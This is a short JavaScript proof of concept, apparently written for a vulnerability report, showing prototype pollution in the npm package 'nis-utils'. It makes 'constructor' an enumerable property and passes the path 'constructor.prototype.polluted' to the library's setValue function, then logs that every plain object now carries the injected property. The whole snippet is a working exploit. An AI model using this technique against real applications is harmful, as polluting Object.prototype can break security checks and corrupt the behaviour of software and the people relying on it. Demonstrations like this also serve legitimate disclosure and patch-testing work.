var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const nisUtils = require('nis-utils');
const object1 = {};
console.log({}.polluted);
nisUtils.object.setValue(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);